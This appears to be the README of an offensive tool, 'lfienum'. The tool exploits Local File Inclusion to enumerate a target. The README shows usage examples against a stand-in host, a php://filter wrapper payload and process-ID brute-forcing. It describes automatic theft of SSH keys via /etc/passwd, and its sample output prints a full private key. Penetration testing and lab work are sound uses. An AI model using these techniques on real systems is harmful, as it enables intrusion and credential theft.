Local File Inclusion Enumeration (PoC)  

Almost whole system enumeration when target is vulnerable to LFI.  

```
lfienum ~by 0bfxgh0st*

Usage python3 lfienum.py <url>

Options:

       --pid          Bruteforce 999 process id
       --wrapper      (php://filter/convert.base64-encode/resource=)

Examples:
           python3 lfienum.py "http://ghost.server/index.php?page="
           python3 lfienum.py "http://ghost.server/index.php?page=" --pid
           python3 lfienum.py "http://ghost.server/index.php?page=" --wrapper index.php
```

Auto id_rsa key extraction from /etc/passwd, check `def ID_RSA():` function  
Output example:  
```
...

[SSH ID_RSA KEY]
ghost key from http://ghost.server/index.php?file=/home/ghost/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
skyX2Q==
-----END OPENSSH PRIVATE KEY-----
```
Internal wordlist from sources:  
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt  
